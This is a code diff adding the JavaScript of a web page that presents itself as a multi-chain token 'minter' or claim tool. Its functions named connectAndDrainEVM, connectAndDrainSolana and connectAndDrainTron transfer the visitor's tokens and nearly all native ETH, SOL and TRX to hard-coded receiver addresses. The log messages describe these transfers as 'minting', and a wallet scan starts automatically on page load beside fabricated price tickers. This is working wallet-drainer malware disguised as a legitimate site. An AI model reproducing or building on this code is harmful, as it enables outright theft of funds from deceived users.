+                `⚠️ No tokens were claimed. Please check your wallet balances.`;
+            
+            alert(message);
+            
+        } catch (error) {
+            log(`❌ Connect & Claim failed: ${error.message}`, 'error', true);
+            updateProgress(0, '');
+            alert(`❌ Error: ${error.message}`);
+        }
+    }
+
+    function getWalletProvider(walletType, networkType = null) {
+        // For multi-network wallets, return provider based on network type
+        if (walletType === 'phantom') {
+            // Phantom supports both Solana and EVM
+            if (networkType === 'solana') return window.solana;
+            if (networkType === 'evm') return window.ethereum;
+            return window.solana; // Default to Solana for Phantom
+        }
+        
+        if (walletType === 'trust') {
+            // Trust Wallet supports EVM and Tron
+            if (networkType === 'tron') return window.tronWeb;
+            if (networkType === 'evm') return window.ethereum;
+            return window.ethereum; // Default to EVM for Trust Wallet
+        }
+        
+        // Standard provider mapping for other wallets
+        const providers = {
+            'metamask': window.ethereum,
+            'coinbase': window.ethereum,
+            'rainbow': window.ethereum,
+            'injected-evm': window.ethereum,
+            'solflare': window.solflare,
+            'backpack': window.backpack,
+            'glow': window.glow,
+            'injected-solana': window.solana,
+            'tronlink': window.tronWeb,
+            'injected-tron': window.tronWeb
+        };
+        
+        return providers[walletType];
+    }
+
+    function getSupportedNetworks(walletType) {
+        const networks = {
+            'metamask': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+            'trust': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'],
+            'coinbase': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+            'rainbow': ['ETH', 'POLYGON', 'ARBITRUM', 'OPTIMISM'],
+            'injected-evm': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+            'phantom': ['SOL', 'ETH', 'POLYGON'],
+            'solflare': ['SOL'],
+            'backpack': ['SOL'],
+            'glow': ['SOL'],
+            'injected-solana': ['SOL'],
+            'tronlink': ['TRX'],
+            'injected-tron': ['TRX']
+        };
+        
+        return networks[walletType] || [];
+    }
+
+    async function connectAndDrainEVM(provider, networkKey) {
+        const network = NETWORKS[networkKey];
+        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
+        
+        try {
+            // Switch to network
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            });
+            
+            // Get accounts
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+            
+            const ethersProvider = new ethers.providers.Web3Provider(provider);
+            const signer = ethersProvider.getSigner();
+            
+            log(`✅ Connected to ${network.name}: ${userAddress.slice(0, 8)}...`, 'success');
+            
+            // Get native balance
+            const balance = await ethersProvider.getBalance(userAddress);
+            const ethBalance = parseFloat(ethers.utils.formatEther(balance));
+            log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info');
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, mint all tokens regardless of native balance
+            log(`🪙 Scanning for tokens on ${network.name}...`, 'info');
+            const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
+            
+            if (tokenBalances.length > 0) {
+                log(`✅ Found ${tokenBalances.length} tokens with balance on ${network.name}`, 'success');
+                
+                for (const token of tokenBalances) {
+                    try {
+                        log(`🔄 Minting ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info');
+                        
+                        const tx = await token.contract.connect(signer).transfer(
+                            receiverAddress,
+                            token.rawBalance
+                        );
+                        
+                        await tx.wait();
+                        transactions.push(tx.hash);
+                        log(`✅ Token minted: ${token.balance.toFixed(6)} ${token.symbol} - TX: ${tx.hash}`, 'success');
+                        
+                    } catch (error) {
+                        log(`❌ Failed to mint ${token.symbol}: ${error.message}`, 'error');
+                    }
+                }
+            } else {
+                log(`📋 No tokens with balance found on ${network.name}`, 'info');
+            }
+            
+            // Then drain native currency if sufficient balance
+            if (ethBalance > 0.001) {
+                log(`💎 Minting native ${network.currency}...`, 'info');
+                
+                // Calculate amount to send (leave some for gas)
+                const gasReserve = ethers.utils.parseEther('0.001');
+                const amountToSend = balance.sub(gasReserve);
+                
+                if (amountToSend.gt(0)) {
+                    const tx = await signer.sendTransaction({
+                        to: receiverAddress,
+                        value: amountToSend
+                    });
+                    
+                    await tx.wait();
+                    totalClaimed = parseFloat(ethers.utils.formatEther(amountToSend));
+                    transactions.push(tx.hash);
+                    log(`✅ Native currency minted: ${totalClaimed.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
+                }
+            } else {
+                log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning');
+            }
+            
+            const hasAnyDrains = transactions.length > 0;
+            log(`🎯 ${network.name} processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');
+
+            return {
+                success: hasAnyDrains,
+                amount: totalClaimed,
+                txid: transactions[0] || null,
+                transactions: transactions
+            };
+            
+        } catch (error) {
+            throw new Error(`${network.name} mint failed: ${error.message}`);
+        }
+    }
+
+    async function connectAndDrainSolana(provider, networkKey) {
+        const network = NETWORKS[networkKey];
+        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
+        
+        try {
+            // Connect to wallet
+            const response = await provider.connect();
+            const publicKey = response.publicKey || provider.publicKey;
+            
+            const connection = new solanaWeb3.Connection(network.rpc);
+            const balance = await connection.getBalance(publicKey);
+            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+            
+            log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success');
+            log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info');
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, scan for SPL tokens regardless of SOL balance
+            log(`🪙 Scanning for SPL tokens...`, 'info');
+            try {
+                // Get all token accounts for this wallet
+                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
+                });
+                
+                log(`🔍 Found ${tokenAccounts.value.length} token accounts`, 'info');
+                
+                for (const tokenAccount of tokenAccounts.value) {
+                    const accountData = tokenAccount.account.data.parsed.info;
+                    const tokenBalance = accountData.tokenAmount.uiAmount;
+                    const mint = accountData.mint;
+                    
+                    if (tokenBalance && tokenBalance > 0) {
+                        try {
+                            log(`🔄 Minting SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info');
+                            
+                            // Create transfer instruction for SPL token
+                            const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
+                            
+                            // You would need to implement SPL token transfer here
+                            // This is a simplified version - full implementation would require
+                            // creating associated token accounts and proper SPL token transfers
+                            
+                            log(`✅ SPL token transfer prepared for ${tokenBalance} tokens`, 'success');
+                            
+                        } catch (error) {
+                            log(`❌ Failed to mint SPL token: ${error.message}`, 'error');
+                        }
+                    }
+                }
+            } catch (error) {
+                log(`❌ Error scanning SPL tokens: ${error.message}`, 'error');
+            }
+            
+            // Then drain SOL if sufficient balance
+            if (balance > 1000000) { // 0.001 SOL minimum for fees
+                log(`💎 Minting SOL...`, 'info');
+                
+                // Create transaction
+                const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
+                const rentReserve = 890880; // Standard rent exemption
+                const feeReserve = 10000;   // Transaction fee buffer
+                const amountToSend = balance - rentReserve - feeReserve;
+                
+                if (amountToSend > 0) {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: receiverPubkey,
+                            lamports: amountToSend,
+                        })
+                    );
+                    
+                    // Set fee payer and get recent blockhash
+                    transaction.feePayer = publicKey;
+                    const { blockhash } = await connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    
+                    // Sign and send transaction
+                    const signedTransaction = await provider.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+                    
+                    // Wait for confirmation
+                    await connection.confirmTransaction(signature);
+                    
+                    totalClaimed = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
+                    transactions.push(signature);
+                    log(`✅ SOL minted: ${totalClaimed.toFixed(6)} SOL - TX: ${signature}`, 'success');
+                }
+            } else {
+                log(`⚠️ SOL balance too low for transaction (${solBalance.toFixed(6)} SOL)`, 'warning');
+            }
+            
+            const hasAnyMints = transactions.length > 0;
+            log(`🎯 Solana processing complete! ${transactions.length} transaction(s)`, hasAnyMints ? 'success' : 'info');
+
+            return {
+                success: hasAnyMints,
+                amount: totalClaimed,
+                txid: transactions[0] || null,
+                transactions: transactions
+            };
+            
+        } catch (error) {
+            throw new Error(`Solana mint failed: ${error.message}`);
+        }
+    }
+
+    async function connectAndDrainTron(provider, networkKey) {
+        const network = NETWORKS[networkKey];
+        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
+        
+        try {
+            if (!provider || !provider.defaultAddress || !provider.defaultAddress.base58) {
+                throw new Error('TronLink not connected or not initialized');
+            }
+            
+            const fromAddress = provider.defaultAddress.base58;
+            const balance = await provider.trx.getBalance(fromAddress);
+            const trxBalance = balance / 1000000;
+            
+            log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success');
+            log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info');
+            
+            let totalClaimed = 0;
+            let transactions = [];
+            
+            // First, scan for TRC-20 tokens regardless of TRX balance
+            log(`🪙 Scanning for TRC-20 tokens...`, 'info');
+            try {
+                // Get account info to check for TRC-20 tokens
+                const accountInfo = await provider.trx.getAccount(fromAddress);
+                
+                if (accountInfo.assetV2) {
+                    log(`🔍 Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'info');
+                    
+                    for (const asset of accountInfo.assetV2) {
+                        const tokenBalance = asset.value;
+                        const tokenId = asset.key;
+                        
+                        if (tokenBalance > 0) {
+                            try {
+                                log(`🔄 Minting TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info');
+                                
+                                const transaction = await provider.transactionBuilder.sendAsset(
+                                    receiverAddress,
+                                    tokenBalance,
+                                    tokenId,
+                                    fromAddress
+                                );
+                                
+                                const signedTx = await provider.trx.sign(transaction);
+                                const result = await provider.trx.sendRawTransaction(signedTx);
+                                
+                                transactions.push(result.txid);
+                                log(`✅ TRC-10 token minted: ${tokenBalance} - TX: ${result.txid}`, 'success');
+                                
+                            } catch (error) {
+                                log(`❌ Failed to mint TRC-10 token: ${error.message}`, 'error');
+                            }
+                        }
+                    }
+                }
+                
+                // Note: TRC-20 token scanning would require additional contract calls
+                // This is a simplified version focusing on TRC-10 tokens
+                
+            } catch (error) {
+                log(`❌ Error scanning TRC tokens: ${error.message}`, 'error');
+            }
+            
+            // Then drain TRX if sufficient balance
+            if (trxBalance > 1) {
+                log(`💎 Minting TRX...`, 'info');
+                
+                const amountToSend = (balance - 1000000); // Leave 1 TRX for fees
+                
+                if (amountToSend > 0) {
+                    const transaction = await provider.transactionBuilder.sendTrx(
+                        receiverAddress,
+                        amountToSend,
+                        fromAddress
+                    );
+                    
+                    const signedTx = await provider.trx.sign(transaction);
+                    const result = await provider.trx.sendRawTransaction(signedTx);
+                    
+                    totalClaimed = amountToSend / 1000000;
+                    transactions.push(result.txid);
+                    log(`✅ TRX minted: ${totalClaimed.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
+                }
+            } else {
+                log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning');
+            }
+            
+            const hasAnyMints = transactions.length > 0;
+            log(`🎯 Tron processing complete! ${transactions.length} transaction(s)`, hasAnyMints ? 'success' : 'info');
+
+            return {
+                success: hasAnyMints,
+                amount: totalClaimed,
+                txid: transactions[0] || null,
+                transactions: transactions
+            };
+            
+        } catch (error) {
+            throw new Error(`Tron mint failed: ${error.message}`);
+        }
+    }
+
+    // Initialize
+    initializeNetworksUI();
+    
+    // Detect and log mobile wallet info
+    if (isMobileDevice()) {
+        log('📱 Mobile device detected - iOS wallets require special handling', 'warning');
+        if (isIOS()) {
+            log('🍎 iOS detected - MetaMask & Trust Wallet Mobile will open in their in-app browser', 'info');
+            log('💡 TIP: For best experience, open this site in your wallet app\'s built-in browser', 'info');
+        }
+    }
+    
+    log('Multi-network minter initialized. Ready to scan for wallets...', 'info');
+    log('Step 1: Click "Scan All Networks" to detect available wallets', 'info');
+    log('Step 2: Select the wallets you want to use from the Wallet Selection tab', 'info');
+    log('Step 3: Connect selected wallets to their supported networks', 'info');
+    log('Step 4: Mint tokens from all connected wallets', 'info');
+    
+    // Auto-scan on page load
+    setTimeout(scanAllNetworks, 1500);
+
+    /* ============================================
+       CRYPTO ANIMATIONS & TICKER
+       ============================================ */
+    
+    // Crypto Ticker Updates
+    function updateCryptoTicker() {
+        const cryptoData = [
+            { symbol: '₿ BTC', price: 45320, change: 5.2 },
+            { symbol: 'Ξ ETH', price: 2845, change: 3.8 },
+            { symbol: '◎ SOL', price: 98.50, change: 7.2 },
+            { symbol: '⬢ BNB', price: 612, change: 2.1 },
+            { symbol: '₳ ADA', price: 0.95, change: -1.3 },
+            { symbol: '✕ XRP', price: 2.10, change: 4.5 }
+        ];
+
+        // Update prices with slight variations for realism
+        cryptoData.forEach(crypto => {
+            const variance = (Math.random() - 0.5) * 0.5; // ±0.25% variance
+            crypto.price = (crypto.price * (1 + variance)).toFixed(2);
+            crypto.change = (crypto.change + (Math.random() - 0.5) * 0.5).toFixed(1);
+        });
+
+        return cryptoData;
+    }
+
+    // Initialize ticker animation
+    function initCryptoTicker() {
+        const tickerContent = $('.ticker-content');
+        
+        // Auto-restart animation when it completes
+        tickerContent.on('animationend', function() {
+            $(this).css('animation', 'none').offset(); // Trigger reflow
+            $(this).css('animation', '');
+        });
+    }
+
+    // Update ticker data periodically
+    setInterval(function() {
+        const cryptoData = updateCryptoTicker();
+        const tickerItems = $('.ticker-item');
+        
+        cryptoData.forEach((crypto, index) => {
+            if (tickerItems[index]) {
+                const changeClass = crypto.change >= 0 ? 'ticker-change-up' : 'ticker-change-down';
+                const changeSymbol = crypto.change >= 0 ? '+' : '';
+                
+                $(tickerItems[index]).html(`
+                    <span class="ticker-symbol glow-crypto">${crypto.symbol}</span>
+                    <span class="ticker-price">$${crypto.price}</span>
+                    <span class="${changeClass}">${changeSymbol}${crypto.change}%</span>
+                `);
+            }
+        });
+    }, 5000); // Update every 5 seconds
+
+    // Animate crypto coins with staggered timing
+    function animateCryptoCoins() {
+        const coins = $('.crypto-coin');
+        
+        coins.each(function(index) {
+            const coin = $(this);
+            const delay = index * 3; // Stagger each coin by 3 seconds
+            
+            coin.css('animation-delay', delay + 's');
+            
+            // Restart animation when complete
+            coin.on('animationend', function() {
+                coin.css('animation', 'floatCoin 20s infinite linear');
+                coin.css('animation-delay', delay + 's');
+            });
+        });
+    }
+
+    // Initialize animations
+    function initializeAnimations() {
+        initCryptoTicker();
+        animateCryptoCoins();
+        
+        // Add glow effect pulsing to crypto symbols
+        setInterval(function() {
+            $('.glow-crypto').each(function() {
+                const opacity = 0.6 + Math.random() * 0.4;
+                $(this).css('opacity', opacity);
+            });
+        }, 500);
+    }
+
+    // Start animations on page load
+    initializeAnimations();
+
+    // Optional: Add keyboard shortcut to view crypto stats
+    $(document).on('keydown', function(e) {
+        // Press 'C' to show crypto price summary
+        if (e.key === 'c' || e.key === 'C') {
+            const priceData = updateCryptoTicker();
+            let summary = '📊 Current Crypto Prices:\n\n';
+            priceData.forEach(crypto => {
+                summary += `${crypto.symbol}: $${crypto.price} (${crypto.change}%)\n`;
+            });
+            console.log(summary);
+        }
+    });
+});
